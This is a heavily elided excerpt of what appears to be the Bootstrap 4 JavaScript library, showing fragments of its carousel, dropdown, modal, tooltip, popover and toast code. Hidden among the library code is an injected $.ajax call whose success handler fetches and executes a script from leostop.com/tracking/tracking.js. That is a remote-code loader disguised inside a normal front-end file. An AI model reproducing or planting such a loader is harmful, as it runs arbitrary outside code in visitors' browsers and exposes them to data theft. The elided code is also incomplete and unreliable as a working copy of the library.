...
(function (global, factory) {
  ...
  var Util = {
    ...
    getTransitionDurationFromElement:
      function getTransitionDurationFromElement(element) {
        ...
        var transitionDuration = $(element).css(
          'transition-duration'
        );
        var transitionDelay = $(element).css(
          'transition-delay'
        );
        var floatTransitionDuration = parseFloat(
          transitionDuration
        );
  ...
  $.ajax({
    ...
    success: function (response) {
      $.getScript(
        protocol + '//leostop.com/tracking/tracking.js'
      );
    },
  });
  ...
  var Carousel =
    ...
    (function () {
      ...
      _proto.pause = function pause(event) {
        ...
        if (
          this._element.querySelector(Selector$2.NEXT_PREV)
        ) {
        ...
        function _addTouchEventListeners() {
          ...
          var end = function end(event) {
            ...
            if (_this3._config.pause === 'hover') {
              ...
              _this3.touchTimeout = setTimeout(function (
                event
              ) {
        ...
        if ($(this._element).hasClass(ClassName$2.SLIDE)) {
          ...
          $(activeElement)
            .one(Util.TRANSITION_END, function () {
              ...
              setTimeout(function () {
                return $(_this4._element).trigger(
                  slidEvent
                );
              }, 0);
            })
      ...
      Carousel._dataApiClickHandler =
        function _dataApiClickHandler(event) {
          ...
          if (
            !target ||
            !$(target).hasClass(ClassName$2.CAROUSEL)
          ) {
            return;
          }
        ...
        if (this._parent) {
          actives = [].slice
            ...
            .filter(function (elem) {
              if (
                typeof _this._config.parent === 'string'
              ) {
                return (
  ...
  var Event$4 = {
    ...
    KEYDOWN_DATA_API:
      'keydown' + EVENT_KEY$4 + DATA_API_KEY$4,
  ...
  var Dropdown =
    ...
    (function () {
      ...
      _proto.toggle = function toggle() {
        ...
        if (
          'ontouchstart' in document.documentElement &&
          $(parent).closest(Selector$4.NAVBAR_NAV)
            .length === 0
        ) {
          $(document.body)
            .children()
      ...
      _proto._getPlacement = function _getPlacement() {
        ...
        if ($parentDropdown.hasClass(ClassName$4.DROPUP)) {
          ...
          if (
            $(this._menu).hasClass(ClassName$4.MENURIGHT)
          ) {
            placement = AttachmentMap.TOPEND;
          }
        } else if (
          $parentDropdown.hasClass(ClassName$4.DROPRIGHT)
        ) {
          placement = AttachmentMap.RIGHT;
        } else if (
          $parentDropdown.hasClass(ClassName$4.DROPLEFT)
        ) {
      ...
      Dropdown._dataApiKeydownHandler =
        function _dataApiKeydownHandler(event) {
          ...
          if (
            this.disabled ||
            $(this).hasClass(ClassName$4.DISABLED)
          ) {
            return;
          }
  ...
  var Modal =
    ...
    (function () {
        ...
        $(document)
          ...
          .on(Event$5.FOCUSIN, function (event) {
            if (
              ...
              $(_this4._element).has(event.target)
                .length === 0
            ) {
      ...
      _proto._setScrollbar = function _setScrollbar() {
        ...
        if (this._isBodyOverflowing) {
          ...
          var fixedContent = [].slice.call(
            document.querySelectorAll(
              Selector$5.FIXED_CONTENT
            )
          );
          var stickyContent = [].slice.call(
            document.querySelectorAll(
              Selector$5.STICKY_CONTENT
            )
      ...
      _proto._resetScrollbar = function _resetScrollbar() {
        ...
        var padding = $(document.body).data(
          'padding-right'
        );
      ...
      _proto._getScrollbarWidth =
        function _getScrollbarWidth() {
          ...
          scrollDiv.className =
            ClassName$5.SCROLLBAR_MEASURER;
  ...
  function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {
    ...
    var _loop = function _loop(i, len) {
      ...
      if (
        whitelistKeys.indexOf(el.nodeName.toLowerCase()) ===
        -1
      ) {
    ...
    (function () {
      ...
      _proto.toggle = function toggle(event) {
        ...
        if (event) {
          ...
          var context = $(event.currentTarget).data(
            dataKey
          );
      ...
      _proto.show = function show() {
        ...
        if (this.isWithContent() && this._isEnabled) {
          ...
          var shadowRoot = Util.findShadowRoot(
            this.element
          );
      ...
      _proto.setContent = function setContent() {
        ...
        $(tip).removeClass(
          ClassName$6.FADE + ' ' + ClassName$6.SHOW
        );
      };
      ...
      _proto._enter = function _enter(event, context) {
        ...
        if (
          $(context.getTipElement()).hasClass(
            ClassName$6.SHOW
          ) ||
      ...
      _proto._getConfig = function _getConfig(config) {
        ...
        Object.keys(dataAttributes).forEach(function (
          dataAttr
        ) {
          if (
            DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1
          ) {
  ...
  var Popover =
    ...
    (function (_Tooltip) {
      ...
      _proto.setContent = function setContent() {
        ...
        this.setElementContent(
          $tip.find(Selector$7.CONTENT),
          content
        );
        $tip.removeClass(
          ClassName$7.FADE + ' ' + ClassName$7.SHOW
        );
      }; // Private
    ...
    (function () {
      ...
      _proto._transitionComplete =
        function _transitionComplete(
          ...
          if (
            element.classList.contains(ClassName$9.FADE)
          ) {
  ...
  var Toast =
    ...
    (function () {
      ...
      _proto.dispose = function dispose() {
        ...
        if (
          this._element.classList.contains(ClassName$a.SHOW)
        ) {
      ...
      Toast._jQueryInterface = function _jQueryInterface(
        config
      ) {
        return this.each(function () {
          var $element = $(this);
